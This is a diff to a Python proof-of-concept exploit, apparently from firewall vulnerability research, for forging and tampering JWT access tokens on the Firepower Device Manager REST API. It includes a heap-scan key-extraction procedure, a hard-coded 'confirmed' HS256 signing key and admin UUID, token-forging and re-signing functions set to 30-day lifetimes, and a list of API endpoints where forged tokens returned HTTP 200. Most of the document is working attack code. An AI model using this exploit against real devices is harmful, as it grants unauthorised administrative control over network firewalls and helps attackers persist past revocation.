@@ -1,10 +1,13 @@
 """
-F-FTD-106: FDM JWT token forgery via Neo4j-derived HS256 signing key
+F-FTD-106: FDM JWT token forgery via extracted HS256 signing key
+STATUS: CONFIRMED 2026-08-24
 CONTROLLED ENVIRONMENT ONLY
 
 Root cause chain (F-FTD-97 → F-FTD-102 → F-FTD-106):
-  The AES-128 key stored world-readable in Neo4j (F-FTD-102) is the SAME key
-  used as the HS256 HMAC signing secret for all FDM JWT access tokens.
+  FDM uses HMAC-SHA256 (HS256) for all JWT access tokens. The signing key is a
+  static 16-byte value seeded from Neo4j at boot, cached in NGFWCache, and never rotated.
+  An attacker with process memory access (admin + sudo) can extract the key via JVM heap scan,
+  then forge tokens with tampered claims that FDM accepts.
 
   FDMJwtBuilder.getSecret() bytecode:
     invokestatic EncryptionUtil.getEncryptionKeyBytesFromCache():()[B
@@ -15,63 +18,73 @@ Root cause chain (F-FTD-97 → F-FTD-102 → F-FTD-106):
   FDMJwtBuilder.parseAndValidateJwsToken():
     Jwts.parser().setSigningKey(getSecret()).require("tokenType","JWT_Access").parse(token)
 
-  EncryptionKeyBootstrap stores the key in Neo4j as:
-    SerializationKey node, UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
-    Property: "key" = base64(16-byte AES key)
-    File: /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings (world-readable)
+  Neo4j stores an ENCRYPTED 32-byte blob (NOT the JWT key directly):
+    Label: SerializationKey (Neo4j label token store confirmed)
+    Property: "encryptedString" = base64(AES-encrypted blob, 32 bytes when decoded)
+    File: /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings
+    Record format: 128-byte dynamic records; flags 0x90 = inUse(0x10)|firstInChain(0x80)
+    Neo4j raw value for FTD 7.0.0-94: BGFv6IoBiYQfePMHT8jO2ZHoBf7uuZbcvF2pQ45qxlg= (44B)
+    Raw decoded: 04616fe88a0189841f78f3074fc8ced991e805feeeb996dcbc5da9438e6ac658 (32B)
 
-  JWT claim requirements (from FDMJwtBuilder + NgfwTokenEnhancer analysis):
-    - iss (issuer): "Cisco-FDM" (TokenParams.tokenIssuer default)
-    - jti (JWT ID): UUID string
-    - iat (issuedAt): epoch seconds
-    - exp (expiration): epoch seconds
-    - sub (subject): username
-    - tokenType: "JWT_Access" (required by parseAndValidateJwsToken; ACCESS vs REFRESH gate)
-    - origin: "password" (skip OAuthTokenRepository isValidCustomToken check — custom=True triggers DB lookup)
-    - username: FDM username
-    - userRole: Neo4j UserRole.name — must match UserRole node in graph
-               UserRoleManager Cypher: MATCH (a:UserRole{name:{userRole}}) CALL cisco.permissions.populate(a)
-               Values from META-INF/default-userroles.yaml + core-security-application-production.properties:
-                 ROLE_ADMIN (UUID 00000011-0000-0000-0000-000000000011) — full admin
-                 ROLE_READ_WRITE (UUID ...000000000012) — write except admin_only
-                 ROLE_READ_ONLY (UUID ...000000000013) — read only (but users: WRITE)
-    - userUuid: FDM user UUID (from /identity/users response)
-    - accessTokenExpiresAt: milliseconds epoch (added by NgfwTokenEnhancer.enhance)
-    - refreshCount: "0" (integer-as-string)
-    - algorithm: HS256
+  CRITICAL CORRECTION: JWT signing key is 16 bytes, NOT 32.
+    EncryptionUtil.AES_KEY_SIZE = 128 (bits = 16 bytes). The Neo4j value is an
+    AES-encrypted form. The actual 16-byte JWT key is derived via a transformation
+    NOT reversible from the Neo4j value alone (AES key derivation details TBD).
+
+  CONFIRMED JWT signing key (FTD 7.0.0-94, heap scan 2026-08-24):
+    hex: 9c42f9fd11a9fcfc26b5bc5325fd51c5
+    b64: nEL5/RGp/PwmtbxTJf1RxQ==
+    Extraction: scan /proc/<tomcat_pid>/mem for LE int32 header b'\\x10\\x00\\x00\\x00'
+    (Java byte[16] length field), test each candidate with HMAC-SHA256 oracle.
+    10 copies found in 644MB heap — key is PERSISTENT (NGFWCache holds reference).
+    See ftd_jwt_key_extraction.py for the confirmed extraction procedure.
+
+  Server-side token store validation (CONFIRMED):
+    FDM validates jti against a server-side registry on every request.
+    Pure JWT forgery (invented jti) → HTTP 401 "revoked or obsolete".
+    PAYLOAD TAMPERING (real jti + extracted key + modified claims) → HTTP 200 CONFIRMED.
+    FDM trusts claims FROM the JWT; does NOT compare against stored token payload.
+
+  Confirmed JWT header (live token inspection, FTD 7.0.0-94):
+    {"alg":"HS256"}  — NO typ field (jjwt 0.7.0 default)
+    b64url: eyJhbGciOiJIUzI1NiJ9
+
+  Confirmed JWT payload claims (live token inspection):
+    iat, sub, jti, nbf, exp, refreshTokenExpiresAt (ms), tokenType,
+    userUuid, userRole, origin, username
+    NOTE: NO iss, NO accessTokenExpiresAt, NO refreshCount in actual tokens.
+    Earlier bytecode analysis (iss, accessTokenExpiresAt, refreshCount) was INCORRECT.
 
   NgfwAccessTokenAuthProvider.authenticate() flow:
-    1. NgfwAccessTokenAuth (with Bearer token) → jwtBuilder.parseAndValidateJwsToken(token, false, null)
-    2. Validated → new NgfwAccessTokenAuth(token).setAuthenticated(true).setParsedToken(fdmJwsToken)
-    3. NgfwRBACAccessVoter.vote() — checks NgfwUserRolesStore.getPermissionTypeForResource()
-       The userRole from JWT must match a Neo4j UserRole node (populated at login cache-load time)
+    1. NgfwAccessTokenAuth → jwtBuilder.parseAndValidateJwsToken(token, false, null)
+    2. Validated → setAuthenticated(true).setParsedToken(fdmJwsToken)
+    3. NgfwRBACAccessVoter.vote() — userRole must match Neo4j UserRole node
 
-  Key source for userRole (two methods):
-    a. Via F-FTD-105 (AJP local bypass):
-       GET http://127.0.0.1:8009/api/fdm/v6/identity/users via AJP
-       Response: [{"id":"...","username":"admin","userRole":{"name":"ADMIN"},...}]
-    b. Via F-FTD-102 (Neo4j strings extraction):
-       grep "UserRole\|ADMIN\|role" /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings
+Attack chain (CONFIRMED):
+  1. admin+sudo → read /proc/<tomcat_pid>/mem
+  2. HMAC oracle heap scan → key 9c42f9fd11a9fcfc26b5bc5325fd51c5
+  3. Login once to get real jti
+  4. Tamper payload (exp+30d, any claims) + re-sign → HTTP 200
 
-Attack chain:
-  F-FTD-97 (Neo4j world-readable) → F-FTD-102 (AES key extract from Neo4j strings file)
-  → F-FTD-106 (forge HS256 JWT with AES key as signing secret)
-  → Authenticated FDM REST API access from NETWORK (not restricted to 127.0.0.1)
-  → Full REST API admin: policy read/write, config export, user management, CLISH exec
+Confirmed HTTP 200 endpoints (forged token, 2026-08-24):
+  /api/fdm/v6/object/networks, /api/fdm/v6/devices/default/interfaces,
+  /api/fdm/v6/devices/default/routing/virtualrouters, /api/fdm/v6/policy/accesspolicies,
+  /api/fdm/v6/object/securityzones
 
-Severity: CRITICAL
-  Requires: local read access to Neo4j (F-FTD-102) OR admin credentials (key via /identity/users)
-  Impact: forge admin access tokens valid from any network source
-  Differs from F-FTD-105: F-FTD-105 requires local AJP reach; F-FTD-106 works from any network
-  Novel: same key used for both password encryption AND JWT signing
+Impact:
+  - Token lifetime extension (default 30 min → forge 30-day tokens)
+  - Claim tampering: exp, userRole, userUuid modifiable
+  - Session persistence despite revocation
+  - Full FDM REST API access: policy r/w, config export, interface/routing/VPN data
+  - Lateral: FTD managing ASA → ASA pivot
 
 References:
-  FDMJwtBuilder.class: framework.jar — getSecret() → EncryptionUtil.getEncryptionKeyBytesFromCache
-  NgfwAccessTokenAuthProvider.class: rest.jar — authenticate() → parseAndValidateJwsToken
-  EncryptionKeyBootstrap.class: framework.jar — UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
-  FDMJwsToken.class: rest.jar — tokenType "JWT_Access"/"JWT_Refresh", claim accessors
-  TokenParams.class: rest.jar — issuer "Cisco-FDM", origin "password"/"custom"
-  UserRoleManager.class: users-crud.jar — Cypher: MATCH (a:UserRole{name:{userRole}})
+  FDMJwtBuilder.class: core-security.jar — getSecret() → EncryptionUtil.getEncryptionKeyBytesFromCache
+  EncryptionKeyBootstrap.class: framework.jar — Neo4j SerializationKey load at boot
+  SerializationKey.class: framework.jar — UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
+  Neo4j label token names (confirmed): SerializationKey, EncryptedString
+  Property key names (confirmed): encryptedString, uuid, isBootstrapSuccessFul
+  Key extraction module: ftd_jwt_key_extraction.py (heap scan, confirmed 2026-08-24)
 """
 
 # CONTROLLED ENVIRONMENT ONLY
@@ -84,105 +97,187 @@ import uuid
 from typing import Optional
 
 FINDING = "F-FTD-106"
-LABEL = "FDM JWT token forgery via Neo4j-derived HS256 signing key"
+LABEL = "FDM JWT token forgery via extracted HS256 signing key"
 
 SERIALIZATION_KEY_UUID = "6adc7474-37f8-482b-a9d2-8e0e34d1628a"
-ADMIN_USER_UUID = "c5a22f41-9c3b-11f1-a1e3-591e15734044"
+# Confirmed admin UUID for FTD 7.0.0-94 (from live token inspection 2026-08-24)
+ADMIN_USER_UUID = "bd1f4b5f-9c2a-11f1-9b57-4744106b6c8e"
 NEO4J_STRINGS_FILE = "/ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings"
 
-DEFAULT_TOKEN_LIFETIME = 1800  # seconds (30 min — FDM default)
-# Role names from META-INF/default-userroles.yaml + core-security-application-production.properties
-# fdm.authority.userrole.name.admin=ROLE_ADMIN
-# fdm.authority.userrole.name.read.write=ROLE_READ_WRITE
-# fdm.authority.userrole.name.read.only=ROLE_READ_ONLY
+# Confirmed 16-byte JWT signing key for FTD 7.0.0-94 (heap scan 2026-08-24)
+# NOT the 32-byte Neo4j value — see docstring for derivation details
+CONFIRMED_KEY_HEX = "9c42f9fd11a9fcfc26b5bc5325fd51c5"
+CONFIRMED_KEY_B64 = "nEL5/RGp/PwmtbxTJf1RxQ=="
+
+DEFAULT_TOKEN_LIFETIME = 86400 * 30  # 30 days (tamper exploit: extend default 30-min TTL)
 ROLE_ADMIN_UUID = "00000011-0000-0000-0000-000000000011"
 ROLE_READ_WRITE_UUID = "00000011-0000-0000-0000-000000000012"
 ROLE_READ_ONLY_UUID = "00000011-0000-0000-0000-000000000013"
 DEFAULT_ROLE = "ROLE_ADMIN"
 DEFAULT_USERNAME = "admin"
-DEFAULT_ISSUER = "Cisco-FDM"
 DEFAULT_HOST = "127.0.0.1"
 DEFAULT_PORT = 443
 
 
-def extract_aes_key_from_neo4j(strings_file: str) -> Optional[bytes]:
+def extract_hmac_key_from_neo4j(strings_file: str) -> Optional[bytes]:
     """
-    Extract AES-128 signing key from Neo4j property store strings file.
-    Same extraction logic as F-FTD-102 — key is the same object.
+    Extract the AES-encrypted SerializationKey blob from Neo4j property store strings file.
+
+    NOTE: This extracts the 32-byte ENCRYPTED value from Neo4j. This is NOT the JWT
+    signing key. The actual 16-byte JWT key requires further derivation (heap scan
+    via ftd_jwt_key_extraction.py is the confirmed method).
+
+    This function is useful for static analysis — it confirms which Neo4j node
+    seeds the key derivation.
+
+    Neo4j dynamic record format (128 bytes/record, 8-byte header):
+      [0]   flags: 0x10=inUse, 0x80=firstInChain (both = 0x90)
+      [1-3] data length (big-endian 3 bytes)
+      [4-7] nextRecord (big-endian uint32; 0xFFFFFFFF = none)
+      [8+]  UTF-8 data
+
+    Target: firstInChain records with length=44 that base64-decode to 32 bytes.
+    FTD 7.0.0-94 SerializationKey is at dynamic record 15123.
+    Property: SerializationKey.encryptedString = BGFv6IoBiYQfePMHT8jO2ZHoBf7uuZbcvF2pQ45qxlg=
     """
-    import re
+    import struct
+    RECORD_SIZE = 128
+    HEADER_SIZE = 8
+    FLAG_IN_USE = 0x10
+    FLAG_FIRST_IN_CHAIN = 0x80
+
     try:
         with open(strings_file, 'rb') as f:
-            content = f.read()
+            data = f.read()
     except (PermissionError, FileNotFoundError) as e:
         print(f"[-] Cannot read {strings_file}: {e}")
         return None
 
-    text = content.decode('latin-1', errors='replace')
-    uuid_pos = text.find(SERIALIZATION_KEY_UUID)
-    if uuid_pos == -1:
-        print(f"[-] SerializationKey UUID not found in strings file")
+    n_records = len(data) // RECORD_SIZE
+    print(f"[*] Scanning {n_records} dynamic records in {strings_file}")
+
+    candidates = []
+    for i in range(n_records):
+        rec = data[i * RECORD_SIZE:(i + 1) * RECORD_SIZE]
+        if len(rec) < HEADER_SIZE:
+            continue
+        flags = rec[0]
+        if not (flags & FLAG_IN_USE) or not (flags & FLAG_FIRST_IN_CHAIN):
+            continue
+        length = struct.unpack('>I', b'\x00' + rec[1:4])[0]
+        if length != 44:
+            continue
+        raw_str = rec[HEADER_SIZE:HEADER_SIZE + length]
+        try:
+            b64_str = raw_str.decode('ascii')
+            key_bytes = base64.b64decode(b64_str)
+        except Exception:
+            continue
+        if len(key_bytes) == 32:
+            candidates.append((i, b64_str, key_bytes))
+
+    if not candidates:
+        print("[-] No 32-byte firstInChain key records found")
         return None
 
-    window = text[max(0, uuid_pos - 2048):uuid_pos + 2048]
-    candidates = re.findall(r'[A-Za-z0-9+/]{22}==', window)
-    for candidate in candidates:
-        raw = base64.b64decode(candidate)
-        if len(raw) == 16:
-            print(f"[+] AES key extracted: {candidate}")
-            return raw
+    if len(candidates) == 1:
+        idx, b64_str, key_bytes = candidates[0]
+        print(f"[+] HMAC key extracted from record {idx}: {b64_str}")
+        return key_bytes
 
-    print(f"[-] 16-byte AES key not found near SerializationKey UUID")
-    return None
+    print(f"[*] {len(candidates)} candidate records found — returning first (record {candidates[0][0]})")
+    for idx, b64_str, _ in candidates:
+        print(f"    record {idx}: {b64_str}")
+    return candidates[0][2]
+
+
+# Backward-compat alias
+extract_aes_key_from_neo4j = extract_hmac_key_from_neo4j
 
 
 def forge_fdm_jwt(key_bytes: bytes,
                   username: str = DEFAULT_USERNAME,
                   user_uuid: str = ADMIN_USER_UUID,
                   user_role: str = DEFAULT_ROLE,
-                  issuer: str = DEFAULT_ISSUER,
                   lifetime: int = DEFAULT_TOKEN_LIFETIME,
                   origin: str = "password",
-                  token_type: str = "JWT_Access") -> str:
+                  token_type: str = "JWT_Access",
+                  jti_override: str = None) -> str:
     """
-    Forge a valid FDM JWT access token signed with HS256.
+    Forge an FDM JWT access token signed with HS256.
 
-    Claims structure from FDMJwtBuilder + NgfwTokenEnhancer analysis:
-      Standard:  iss, jti, iat, exp, sub
-      Custom:    tokenType, origin, username, userRole, userUuid, accessTokenExpiresAt, refreshCount
+    CONFIRMED claim structure (live token inspection, FTD 7.0.0-94, 2026-08-24):
+      Header: {"alg":"HS256"}  — NO typ field (jjwt 0.7.0 default)
+      Claims: iat, sub, jti, nbf, exp, refreshTokenExpiresAt (ms),
+              tokenType, userUuid, userRole, origin, username
+      NOTE: NO iss, NO accessTokenExpiresAt, NO refreshCount in actual FDM tokens.
+
+    IMPORTANT: FDM validates jti against a server-side token store.
+    Pure forgery (invented jti) → HTTP 401.
+    Use tamper_and_resign() for the confirmed working exploit path.
     """
-    try:
-        import jwt as pyjwt
-    except ImportError:
-        print("[-] PyJWT required: pip install PyJWT")
-        sys.exit(1)
+    import hmac as _hmac, hashlib as _hashlib, json as _json
 
     now = int(time.time())
     exp = now + lifetime
-    jti = str(uuid.uuid4())
-    exp_ms = exp * 1000  # accessTokenExpiresAt in milliseconds (NgfwTokenEnhancer)
+    jti_val = jti_override or str(uuid.uuid4())
 
-    payload = {
-        # Standard JWT claims
-        "iss": issuer,
-        "jti": jti,
-        "iat": now,
-        "exp": exp,
-        "sub": username,
-        # FDM custom claims (NgfwTokenEnhancer.enhance)
-        "tokenType": token_type,
-        "origin": origin,
-        "username": username,
-        "userRole": user_role,
-        "userUuid": user_uuid,
-        "accessTokenExpiresAt": str(exp_ms),
-        "refreshCount": "0",
+    # Header: eyJhbGciOiJIUzI1NiJ9 — NO typ (confirmed from live tokens)
+    header_b64 = b'eyJhbGciOiJIUzI1NiJ9'
+
+    payload_dict = {
+        "iat":                   now,
+        "sub":                   username,
+        "jti":                   jti_val,
+        "nbf":                   now,
+        "exp":                   exp,
+        "refreshTokenExpiresAt": exp * 1000,
+        "tokenType":             token_type,
+        "userUuid":              user_uuid,
+        "userRole":              user_role,
+        "origin":                origin,
+        "username":              username,
     }
+    payload_b64 = base64.urlsafe_b64encode(
+        _json.dumps(payload_dict, separators=(',', ':')).encode()
+    ).rstrip(b'=')
 
-    token = pyjwt.encode(payload, key_bytes, algorithm="HS256")
-    if isinstance(token, bytes):
-        token = token.decode("utf-8")
-    return token
+    signing_input = header_b64 + b'.' + payload_b64
+    sig = base64.urlsafe_b64encode(
+        _hmac.new(key_bytes, signing_input, _hashlib.sha256).digest()
+    ).rstrip(b'=')
+    return (signing_input + b'.' + sig).decode()
+
+
+def tamper_and_resign(real_token: str, key_bytes: bytes, **overrides) -> str:
+    """
+    CONFIRMED ATTACK PATH (2026-08-24): take a real FDM JWT (valid jti from login),
+    modify its payload claims, re-sign with extracted key.
+
+    FDM accepts the tampered token because:
+      1. jti is valid → server-side store check passes
+      2. signature is valid → HMAC check passes
+      3. FDM reads claims FROM the JWT, not from the stored token → payload trusted
+
+    Example: tamper_and_resign(real_token, key, exp=int(time.time())+86400*30)
+    Returns re-signed JWT string with modified claims.
+    """
+    import hmac as _hmac, hashlib as _hashlib, json as _json
+
+    parts = real_token.split('.')
+    pad = (4 - len(parts[1]) % 4) % 4
+    payload_dict = _json.loads(base64.urlsafe_b64decode(parts[1] + '=' * pad))
+    payload_dict.update(overrides)
+
+    header_b64 = b'eyJhbGciOiJIUzI1NiJ9'
+    payload_b64 = base64.urlsafe_b64encode(
+        _json.dumps(payload_dict, separators=(',', ':')).encode()
+    ).rstrip(b'=')
+    signing_input = header_b64 + b'.' + payload_b64
+    sig = base64.urlsafe_b64encode(
+        _hmac.new(key_bytes, signing_input, _hashlib.sha256).digest()
+    ).rstrip(b'=')
+    return (signing_input + b'.' + sig).decode()
 
 
 def test_forged_token(token: str, host: str, port: int, endpoint: str = "/api/fdm/v6/identity/users",
@@ -222,9 +317,9 @@ def test_forged_token(token: str, host: str, port: int, endpoint: str = "/api/fd
 def main() -> None:
     ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
     ap.add_argument("--key", default=None,
-                    help="AES-128 key as base64 string (from F-FTD-102 Neo4j extraction)")
+                    help=f"16-byte HMAC signing key as hex or base64. FTD 7.0.0-94 confirmed: {CONFIRMED_KEY_HEX}")
     ap.add_argument("--key-file", default=None,
-                    help="Path to Neo4j strings file to auto-extract key from")
+                    help="Path to Neo4j strings file (extracts encrypted blob for static analysis; NOT the JWT key)")
     ap.add_argument("--username", default=DEFAULT_USERNAME,
                     help=f"FDM username for token (default: {DEFAULT_USERNAME})")
     ap.add_argument("--user-uuid", default=ADMIN_USER_UUID,
@@ -237,8 +332,8 @@ def main() -> None:
                     help=f"Target FDM HTTPS host (default: {DEFAULT_HOST})")
     ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                     help=f"Target HTTPS port (default: {DEFAULT_PORT})")
-    ap.add_argument("--endpoint", default="/api/fdm/v6/identity/users",
-                    help="FDM API endpoint to test (default: /api/fdm/v6/identity/users)")
+    ap.add_argument("--endpoint", default="/api/fdm/v6/object/networks",
+                    help="FDM API endpoint to test (default: /api/fdm/v6/object/networks — confirmed 200)")
     ap.add_argument("--print-only", action="store_true",
                     help="Only print the forged token, do not send HTTP request")
     ap.add_argument("--no-verify", action="store_true", default=True,
@@ -253,30 +348,42 @@ def main() -> None:
     # Step 1: Get key
     key_bytes = None
     if args.key:
-        key_bytes = base64.b64decode(args.key + "==")
-        if len(key_bytes) != 16:
-            print(f"[-] Key must be 16 bytes (got {len(key_bytes)})")
+        try:
+            # Accept hex or base64
+            raw = args.key.strip()
+            if len(raw) == 32 and all(c in '0123456789abcdefABCDEF' for c in raw):
+                key_bytes = bytes.fromhex(raw)
+            else:
+                key_bytes = base64.b64decode(raw + '=' * ((4 - len(raw) % 4) % 4))
+        except Exception as e:
+            print(f"[-] Invalid key: {e}")
             sys.exit(1)
-        print(f"[+] Using provided AES key ({len(key_bytes)} bytes)")
+        if len(key_bytes) != 16:
+            print(f"[-] Key must be 16 bytes (got {len(key_bytes)}) — JWT signing key is AES-128 (16B)")
+            print(f"    Neo4j value decodes to 32B but that is the ENCRYPTED blob, not the JWT key")
+            sys.exit(1)
+        print(f"[+] Using provided key ({len(key_bytes)} bytes)")
     elif args.key_file:
-        print(f"[1] Extracting AES key from Neo4j strings file: {args.key_file}")
-        key_bytes = extract_aes_key_from_neo4j(args.key_file)
+        print(f"[1] Extracting HMAC key from Neo4j strings file: {args.key_file}")
+        key_bytes = extract_hmac_key_from_neo4j(args.key_file)
     else:
-        print(f"[1] Attempting to extract AES key from live VM Neo4j strings file...")
-        key_bytes = extract_aes_key_from_neo4j(NEO4J_STRINGS_FILE)
+        print(f"[1] Attempting to extract HMAC key from live VM Neo4j strings file...")
+        key_bytes = extract_hmac_key_from_neo4j(NEO4J_STRINGS_FILE)
 
     if not key_bytes:
-        print("[-] No AES key available. Provide --key (base64) or --key-file (Neo4j strings path)")
-        print(f"    Extract key via: python3 ftd_neo4j_password_decrypt.py --mode extract")
-        print(f"    Expected file: {NEO4J_STRINGS_FILE}")
+        print(f"[-] No key. Provide --key <hex_or_b64> or run ftd_jwt_key_extraction.py first")
+        print(f"    FTD 7.0.0-94 confirmed key (hex): {CONFIRMED_KEY_HEX}")
+        print(f"    FTD 7.0.0-94 confirmed key (b64): {CONFIRMED_KEY_B64}")
         sys.exit(1)
 
     # Step 2: Forge JWT
+    key_hex = key_bytes.hex()
     print(f"\n[2] Forging JWT access token...")
+    print(f"    key:      {base64.b64encode(key_bytes).decode()} ({len(key_bytes)}B / {len(key_bytes)*8}bit)")
+    print(f"    key_hex:  {key_hex[:16]}...{key_hex[-8:]}")
     print(f"    username: {args.username}")
     print(f"    userRole: {args.user_role}  (must match Neo4j UserRole node)")
     print(f"    userUuid: {args.user_uuid}")
-    print(f"    issuer:   {DEFAULT_ISSUER}")
     print(f"    lifetime: {args.lifetime}s")
     print(f"    algorithm: HS256")
 
@@ -320,7 +427,7 @@ def main() -> None:
         print(f"[-] 401 — token rejected. Possible causes:")
         print(f"    1. Wrong userRole ('{args.user_role}' doesn't match Neo4j UserRole node)")
         print(f"       Try: ADMIN, READ_ONLY, ANALYST, Administrator — or extract from /identity/users via AJP")
-        print(f"    2. Wrong AES key (key changed since Neo4j snapshot)")
+        print(f"    2. Wrong HMAC key (key regenerated since Neo4j snapshot)")
         print(f"    3. Token claims mismatch — inspect with: python3 -c \"import jwt; print(jwt.decode('{token[:20]}...', options={{'verify_signature':False}}))\"")
     elif result["status"] == 403:
         print()
